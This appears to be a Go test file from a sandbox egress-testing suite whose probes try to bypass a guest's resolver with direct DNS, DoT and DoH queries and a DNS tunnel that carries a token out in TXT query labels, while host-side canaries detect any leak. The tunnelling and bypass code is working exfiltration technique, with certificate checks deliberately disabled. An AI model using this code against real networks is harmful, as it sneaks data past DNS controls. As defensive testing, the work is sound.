// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package suite

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"syscall"
	"time"
)

// The I3 probes send a DNS query for a name no policy can allow straight to a
// listener the judge started on the host, bypassing whatever resolver the guest
// was given: over plain UDP and TCP, inside TLS (DoT, RFC 7858) and inside
// HTTPS (DoH, RFC 8484), and as a tunnel that carries data out in the labels.
// A query that arrives is the proof; the guest's word is not. Every probe is
// given a literal address and never looks a name up.

// dnsName is the name the guest asks for: unique per run, never allowed.
func dnsName(token string) string { return token + ".invalid." }

// dnsUDPProbe sends an A query for the token's name as one datagram to args[0].
func dnsUDPProbe(args []string) Result {
	if len(args) != 2 {
		return Result{Status: "error", Detail: "want address and token"}
	}
	return sendUDP(args[0], dnsQuery(dnsQuestion{Name: dnsName(args[1]), Type: dnsTypeA}))
}

// dnsTCPProbe and dotProbe send the same query, length-prefixed, over a TCP
// connection to args[0], bare or inside TLS to a server the guest does not
// verify (it is the attacker, and the server is its own).
func dnsTCPProbe(args []string) Result { return dnsStream(args, false) }
func dotProbe(args []string) Result    { return dnsStream(args, true) }

func dnsStream(args []string, withTLS bool) Result {
	if len(args) != 2 {
		return Result{Status: "error", Detail: "want address and token"}
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	var c net.Conn
	var err error
	if withTLS {
		c, err = (&tls.Dialer{Config: hostileTLS()}).DialContext(ctx, "tcp", args[0])
	} else {
		c, err = (&net.Dialer{}).DialContext(ctx, "tcp", args[0])
	}
	if err != nil {
		return dialFailed(err)
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(3 * time.Second))
	if _, err := c.Write(dnsFrame(dnsQuery(dnsQuestion{Name: dnsName(args[1]), Type: dnsTypeA}))); err != nil {
		return Result{Status: "connected-write-failed", Detail: err.Error()}
	}
	return Result{Status: "connected", Detail: "sent a query for " + dnsName(args[1]) + " to " + args[0]}
}

// dohProbe sends the query to https://args[0]/dns-query as RFC 8484 says: in
// the body of a POST, or base64url in the dns parameter of a GET.
func dohProbe(method string) Probe {
	return func(args []string) Result {
		if len(args) != 2 {
			return Result{Status: "error", Detail: "want address and token"}
		}
		msg := dnsQuery(dnsQuestion{Name: dnsName(args[1]), Type: dnsTypeA})
		url := "https://" + args[0] + "/dns-query"
		var req *http.Request
		if method == http.MethodGet {
			req, _ = http.NewRequest(method, url+"?dns="+base64.RawURLEncoding.EncodeToString(msg), nil)
		} else {
			req, _ = http.NewRequest(method, url, bytes.NewReader(msg))
			req.Header.Set("Content-Type", "application/dns-message")
		}
		req.Header.Set("Accept", "application/dns-message")
		client := &http.Client{Timeout: 3 * time.Second, Transport: &http.Transport{TLSClientConfig: hostileTLS()}}
		resp, err := client.Do(req)
		if err != nil {
			return dialFailed(err)
		}
		resp.Body.Close()
		return Result{Status: "connected", Detail: fmt.Sprintf("%s /dns-query for %s: HTTP %d from %s", method, dnsName(args[1]), resp.StatusCode, args[0])}
	}
}

// The tunnel carries the token out in pieces, each the data label of a TXT
// query under one apex, the way DNS tunnels move data: seq.data.tunnel.invalid.
const (
	tunnelApex  = "tunnel.invalid."
	tunnelChunk = 8
)

// tunnelProbe sends the token to args[0] as a series of TXT queries.
func tunnelProbe(args []string) Result {
	if len(args) != 2 {
		return Result{Status: "error", Detail: "want address and token"}
	}
	c, err := net.DialTimeout("udp", args[0], 3*time.Second)
	if err != nil {
		return dialFailed(err)
	}
	defer c.Close()
	token, n := args[1], 0
	for i := 0; i*tunnelChunk < len(token); i++ {
		chunk := token[i*tunnelChunk : min(len(token), (i+1)*tunnelChunk)]
		q := dnsQuestion{ID: uint16(i), Name: fmt.Sprintf("%d.%s.%s", i, chunk, tunnelApex), Type: dnsTypeTXT}
		if _, err := c.Write(dnsQuery(q)); err != nil {
			return Result{Status: "send-failed", Detail: err.Error()}
		}
		n++
	}
	return Result{Status: "sent", Detail: fmt.Sprintf("%d TXT queries carrying %d bytes to %s", n, len(token), args[0])}
}

// hostileTLS is the client side of the attacker's own channel: it verifies
// nothing and names a server that is not the address it dials.
func hostileTLS() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true, ServerName: "dns.invalid"} //nolint:gosec // the probe is the attacker
}

// dialFailed turns a dial error into the result dialProbe reports for it:
// no route, a refusal (the guest kernel's own RST under ADR-003), a reset,
// or a timeout.
func dialFailed(err error) Result {
	var ne net.Error
	switch {
	case errors.As(err, &ne) && ne.Timeout():
		return Result{Status: "timeout", Detail: err.Error()}
	case errors.Is(err, syscall.ECONNREFUSED):
		return Result{Status: "refused", Detail: err.Error()}
	case errors.Is(err, syscall.ECONNRESET):
		return Result{Status: "reset", Detail: err.Error()}
	}
	return Result{Status: "unreachable", Detail: err.Error()}
}

// A dnsListener starts a capture on the host at addr, reports every DNS query
// it receives through got, and returns the address the guest is told to use.
type dnsListener func(addr string, got func(dnsQuestion)) (target string, stop func(), err error)

// dnsCanary starts listen on the host's own address and has the guest send its
// queries there. The invariant holds only if no query for the token's name
// arrived, as leaked judges, and the guest reports no connection.
func dnsCanary(listen dnsListener, leaked func(qs []dnsQuestion, token string) (string, bool)) Judge {
	return func(ctx context.Context, s Session) (bool, string, error) {
		addr, err := resolve(hostAddr + ":0")
		if err != nil {
			return false, "", err
		}
		var mu sync.Mutex
		var got []dnsQuestion
		target, stop, err := listen(addr, func(q dnsQuestion) {
			mu.Lock()
			defer mu.Unlock()
			got = append(got, q)
		})
		if err != nil {
			return false, "", fmt.Errorf("canary listener: %w", err)
		}
		defer stop()
		want := newToken()
		r, err := s.Run(target, want)
		time.Sleep(200 * time.Millisecond) // a datagram in flight on loopback
		stop()
		if err != nil {
			return false, "", err
		}
		mu.Lock()
		defer mu.Unlock()
		if what, ok := leaked(got, want); ok {
			return false, fmt.Sprintf("%s reached the canary at %s (guest says %s: %s)", what, target, r.Status, r.Detail), nil
		}
		if r.Status == "connected" {
			return false, fmt.Sprintf("the guest connected to the canary at %s (%d queries; guest says %s: %s)", target, len(got), r.Status, r.Detail), nil
		}
		return true, fmt.Sprintf("no query for the token's name arrived (%d others; guest says %s: %s)", len(got), r.Status, r.Detail), nil
	}
}

// queried says whether a query for the token's name is among qs.
func queried(qs []dnsQuestion, token string) (string, bool) {
	for _, q := range qs {
		if q.Name == dnsName(token) {
			return fmt.Sprintf("the guest's query (id %d, type %d) for %s", q.ID, q.Type, q.Name), true
		}
	}
	return "", false
}

// tunnelled says whether the TXT queries under the tunnel apex carried pieces
// of the token out. One piece is a leak: a tunnel that loses a datagram still
// moved the rest, so the judge never waits for the whole token to reassemble.
func tunnelled(qs []dnsQuestion, token string) (string, bool) {
	n := 0
	for _, q := range qs {
		if q.Type != dnsTypeTXT || !strings.HasSuffix(q.Name, "."+tunnelApex) {
			continue
		}
		_, chunk, _ := strings.Cut(strings.TrimSuffix(q.Name, "."+tunnelApex), ".")
		if chunk != "" && strings.Contains(token, chunk) {
			n++
		}
	}
	if n > 0 {
		return fmt.Sprintf("%d TXT queries that carried pieces of the token out in their labels", n), true
	}
	return "", false
}

// dnsOverUDP captures datagrams.
func dnsOverUDP(addr string, got func(dnsQuestion)) (string, func(), error) {
	pc, err := net.ListenPacket("udp4", addr)
	if err != nil {
		return "", nil, err
	}
	var wg sync.WaitGroup
	wg.Go(func() {
		buf := make([]byte, 4096)
		for {
			n, _, err := pc.ReadFrom(buf)
			if err != nil {
				return
			}
			if q, ok := parseDNSQuery(buf[:n]); ok {
				got(q)
			}
		}
	})
	return pc.LocalAddr().String(), func() { pc.Close(); wg.Wait() }, nil
}

// dnsOverTCP captures one length-prefixed query per connection, bare or
// inside TLS with a certificate nothing verifies.
func dnsOverTCP(withTLS bool) dnsListener {
	return func(addr string, got func(dnsQuestion)) (string, func(), error) {
		ln, err := net.Listen("tcp4", addr)
		if err != nil {
			return "", nil, err
		}
		if withTLS {
			cfg, err := certificate()
			if err != nil {
				ln.Close()
				return "", nil, err
			}
			ln = tls.NewListener(ln, cfg)
		}
		// wg covers the accept loop and every connection it spawned; a
		// connection's goroutine is added from inside the loop, so the count
		// never reaches zero while one can still be added. The 2 s deadline
		// bounds each connection, so Wait never blocks for long.
		var wg sync.WaitGroup
		wg.Go(func() {
			for {
				c, err := ln.Accept()
				if err != nil {
					return
				}
				wg.Go(func() {
					defer c.Close()
					c.SetDeadline(time.Now().Add(2 * time.Second))
					if q, ok := readFramed(c); ok {
						got(q)
					}
				})
			}
		})
		return ln.Addr().String(), func() { ln.Close(); wg.Wait() }, nil
	}
}

func readFramed(r io.Reader) (dnsQuestion, bool) {
	var hdr [2]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return dnsQuestion{}, false
	}
	msg := make([]byte, binary.BigEndian.Uint16(hdr[:]))
	if _, err := io.ReadFull(r, msg); err != nil {
		return dnsQuestion{}, false
	}
	return parseDNSQuery(msg)
}

// dnsOverHTTPS captures RFC 8484 requests to any path, POST body or GET dns
// parameter, on a TLS server with a certificate nothing verifies.
func dnsOverHTTPS(addr string, got func(dnsQuestion)) (string, func(), error) {
	ln, err := net.Listen("tcp4", addr)
	if err != nil {
		return "", nil, err
	}
	cfg, err := certificate()
	if err != nil {
		ln.Close()
		return "", nil, err
	}
	srv := &http.Server{
		TLSConfig:   cfg,
		ReadTimeout: 2 * time.Second,
		ErrorLog:    log.New(io.Discard, "", 0),
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var msg []byte
			if r.Method == http.MethodGet {
				msg, _ = base64.RawURLEncoding.DecodeString(r.URL.Query().Get("dns"))
			} else {
				msg, _ = io.ReadAll(io.LimitReader(r.Body, 4096))
			}
			if q, ok := parseDNSQuery(msg); ok {
				got(q)
			}
			w.WriteHeader(http.StatusOK)
		}),
	}
	// stop refuses new connections, waits for handlers in flight (each bounded
	// by ReadTimeout) and only then returns, so that every query that arrived
	// has been reported. Close is the backstop should Shutdown give up.
	var wg sync.WaitGroup
	wg.Go(func() { srv.ServeTLS(ln, "", "") })
	return ln.Addr().String(), func() {
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		srv.Shutdown(ctx)
		srv.Close()
		wg.Wait()
	}, nil
}
